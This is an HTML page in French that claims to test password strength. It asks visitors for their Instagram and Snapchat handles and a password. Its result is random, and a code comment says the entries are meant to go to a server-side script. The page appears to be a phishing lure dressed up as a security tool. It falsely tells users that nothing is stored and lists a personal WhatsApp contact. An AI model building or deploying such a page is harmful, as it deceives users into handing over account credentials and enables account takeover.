<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Testeur de Sécurité de Mot de Passe</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f9f9f9;
      margin: 0;
      padding: 2em;
    }
    .container {
      background: #fff;
      border: 1px solid #ccc;
      padding: 20px;
      max-width: 500px;
      margin: auto;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    h1, h2 {
      text-align: center;
      color: #333;
    }
    label {
      font-weight: bold;
      display: block;
      margin-top: 15px;
    }
    input {
      padding: 10px;
      width: 100%;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    button {
      padding: 10px 20px;
      background: #007BFF;
      color: #fff;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      margin-top: 20px;
      width: 100%;
    }
    .resultat {
      margin-top: 20px;
      font-weight: bold;
      text-align: center;
      color: #444;
    }
    .aide {
      background: #f1f1f1;
      padding: 20px;
      margin-top: 40px;
      border-radius: 8px;
      max-width: 500px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.05);
      text-align: center;
    }
    .aide a {
      text-decoration: none;
      color: #007BFF;
      font-weight: bold;
    }
    .whatsapp {
      background: #25D366;
      color: #fff;
      padding: 10px 15px;
      border-radius: 5px;
      text-decoration: none;
      display: inline-block;
      margin-top: 10px;
    }
    .securite {
      font-size: 14px;
      color: #666;
      text-align: center;
      margin-top: 10px;
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>🔐 Testeur de Sécurité de Mot de Passe</h1>
    <p class="securite">✅ Site sécurisé : aucune donnée n'est enregistrée. Les pseudos et résultats sont transmis uniquement pour analyse confidentielle.</p>

    <label for="pseudoInsta">📸 Pseudo Instagram :</label>
    <input type="text" id="pseudoInsta" placeholder="@votre_insta">

    <label for="pseudoSnap">👻 Pseudo Snap :</label>
    <input type="text" id="pseudoSnap" placeholder="@votre_snap">

    <label for="motdepasse">🔑 Mot de passe :</label>
    <input type="password" id="motdepasse" placeholder="Votre mot de passe">

    <button onclick="testerMotDePasse()">Tester</button>
    <div class="resultat" id="resultat"></div>
  </div>

  <div class="aide">
    <h3>📞 Besoin d'aide ?</h3>
    <p>Contactez-moi directement :</p>
    <p>📱 <a href="tel:+33749127131">07 49 12 71 31</a></p>
    <a href="https://wa.me/33749127131" target="_blank" class="whatsapp">📩 Envoyer un message WhatsApp</a>
  </div>

  <script>
    function testerMotDePasse() {
      const mot = document.getElementById('motdepasse').value;
      const pseudoInsta = document.getElementById('pseudoInsta').value;
      const pseudoSnap = document.getElementById('pseudoSnap').value;
      const resultat = document.getElementById('resultat');

      if (!mot || mot.length < 4) {
        resultat.textContent = '⛔ Veuillez entrer un mot de passe d\'au moins 4 caractères.';
        return;
      }

      const tempsSimule = Math.random() * 15;
      const statut = tempsSimule < 10 ? 'NON sécurisé' : 'sécurisé';
      resultat.textContent = `🔍 Résultat : ${statut} (deviné en ${tempsSimule.toFixed(2)} secondes)`;

      // Simulation d'envoi (à connecter à ton script Python côté serveur)
      console.log(`Pseudo Instagram : ${pseudoInsta}`);
      console.log(`Pseudo Snap : ${pseudoSnap}`);
      console.log(`Résultat : ${statut} (${tempsSimule.toFixed(2)}s)`);
    }
  </script>

</body>
</html>
